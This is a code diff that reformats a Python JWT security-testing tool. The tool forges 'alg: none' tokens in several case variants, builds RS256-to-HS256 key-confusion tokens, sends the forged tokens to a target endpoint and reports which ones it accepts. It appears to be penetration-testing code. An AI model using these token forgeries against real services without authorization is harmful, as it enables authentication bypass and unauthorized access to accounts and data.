@@ -35,10 +35,19 @@ def decode_jwt(token):
         "alg_none_in_header": header.get("alg", "").lower() in ("none", ""),
         "alg_symmetric": header.get("alg", "").startswith("HS"),
         "no_expiry": "exp" not in payload,
-        "expired": payload.get("exp", float("inf")) < datetime.utcnow().timestamp() if "exp" in payload else False,
+        "expired": (
+            payload.get("exp", float("inf")) < datetime.utcnow().timestamp()
+            if "exp" in payload
+            else False
+        ),
         "no_issuer": "iss" not in payload,
     }
-    return {"header": header, "payload": payload, "signature_present": bool(signature), "vulnerability_checks": vuln_checks}
+    return {
+        "header": header,
+        "payload": payload,
+        "signature_present": bool(signature),
+        "vulnerability_checks": vuln_checks,
+    }
 
 
 def forge_none_token(token, modify_claims=None):
@@ -52,9 +61,18 @@ def forge_none_token(token, modify_claims=None):
     new_payload = b64url_encode(json.dumps(claims).encode())
     variants = [
         {"name": "alg_none", "token": f"{none_header}.{new_payload}."},
-        {"name": "alg_None", "token": f"{b64url_encode(json.dumps({'alg': 'None', 'typ': 'JWT'}).encode())}.{new_payload}."},
-        {"name": "alg_NONE", "token": f"{b64url_encode(json.dumps({'alg': 'NONE', 'typ': 'JWT'}).encode())}.{new_payload}."},
-        {"name": "alg_nOnE", "token": f"{b64url_encode(json.dumps({'alg': 'nOnE', 'typ': 'JWT'}).encode())}.{new_payload}."},
+        {
+            "name": "alg_None",
+            "token": f"{b64url_encode(json.dumps({'alg': 'None', 'typ': 'JWT'}).encode())}.{new_payload}.",
+        },
+        {
+            "name": "alg_NONE",
+            "token": f"{b64url_encode(json.dumps({'alg': 'NONE', 'typ': 'JWT'}).encode())}.{new_payload}.",
+        },
+        {
+            "name": "alg_nOnE",
+            "token": f"{b64url_encode(json.dumps({'alg': 'nOnE', 'typ': 'JWT'}).encode())}.{new_payload}.",
+        },
         {"name": "empty_sig", "token": f"{none_header}.{new_payload}"},
         {"name": "no_dot", "token": f"{none_header}.{new_payload}"},
     ]
@@ -74,24 +92,34 @@ def test_alg_confusion(token, public_key_file=None):
     if public_key_file:
         try:
             pubkey = open(public_key_file, "rb").read()
-            hs256_header = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
+            hs256_header = b64url_encode(
+                json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
+            )
             payload_b64 = b64url_encode(json.dumps(claims).encode())
             signing_input = f"{hs256_header}.{payload_b64}".encode()
-            signature = b64url_encode(hmac.new(pubkey, signing_input, hashlib.sha256).digest())
-            results["tests"].append({
-                "name": "RS256_to_HS256_confusion",
-                "forged_token": f"{hs256_header}.{payload_b64}.{signature}",
-                "description": "Uses RSA public key as HMAC-SHA256 secret",
-            })
+            signature = b64url_encode(
+                hmac.new(pubkey, signing_input, hashlib.sha256).digest()
+            )
+            results["tests"].append(
+                {
+                    "name": "RS256_to_HS256_confusion",
+                    "forged_token": f"{hs256_header}.{payload_b64}.{signature}",
+                    "description": "Uses RSA public key as HMAC-SHA256 secret",
+                }
+            )
         except Exception as e:
-            results["tests"].append({"name": "RS256_to_HS256_confusion", "error": str(e)})
+            results["tests"].append(
+                {"name": "RS256_to_HS256_confusion", "error": str(e)}
+            )
     none_header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
     payload_b64 = b64url_encode(json.dumps(claims).encode())
-    results["tests"].append({
-        "name": "alg_none_downgrade",
-        "forged_token": f"{none_header}.{payload_b64}.",
-        "description": "Downgrade to 'none' algorithm — removes signature",
-    })
+    results["tests"].append(
+        {
+            "name": "alg_none_downgrade",
+            "forged_token": f"{none_header}.{payload_b64}.",
+            "description": "Downgrade to 'none' algorithm — removes signature",
+        }
+    )
     return results
 
 
@@ -108,22 +136,32 @@ def test_jwt_endpoint(url, original_token, forged_tokens, headers=None):
         try:
             resp = requests.get(url, headers=test_headers, timeout=10)
             accepted = resp.status_code in (200, 201, 204)
-            results.append({
-                "variant": ft["name"], "status": resp.status_code,
-                "accepted": accepted, "body_snippet": resp.text[:200],
-            })
+            results.append(
+                {
+                    "variant": ft["name"],
+                    "status": resp.status_code,
+                    "accepted": accepted,
+                    "body_snippet": resp.text[:200],
+                }
+            )
         except Exception as e:
             results.append({"variant": ft["name"], "error": str(e)})
     orig_resp = None
     try:
-        resp = requests.get(url, headers={**hdrs, "Authorization": f"Bearer {original_token}"}, timeout=10)
+        resp = requests.get(
+            url,
+            headers={**hdrs, "Authorization": f"Bearer {original_token}"},
+            timeout=10,
+        )
         orig_resp = {"status": resp.status_code, "body_length": len(resp.text)}
     except Exception:
         pass
     vulnerable = [r for r in results if r.get("accepted")]
     return {
-        "url": url, "original_response": orig_resp,
-        "tests": results, "vulnerable_variants": len(vulnerable),
+        "url": url,
+        "original_response": orig_resp,
+        "tests": results,
+        "vulnerable_variants": len(vulnerable),
         "finding": "JWT_NONE_VULNERABLE" if vulnerable else "JWT_NONE_REJECTED",
         "severity": "CRITICAL" if vulnerable else "INFO",
     }
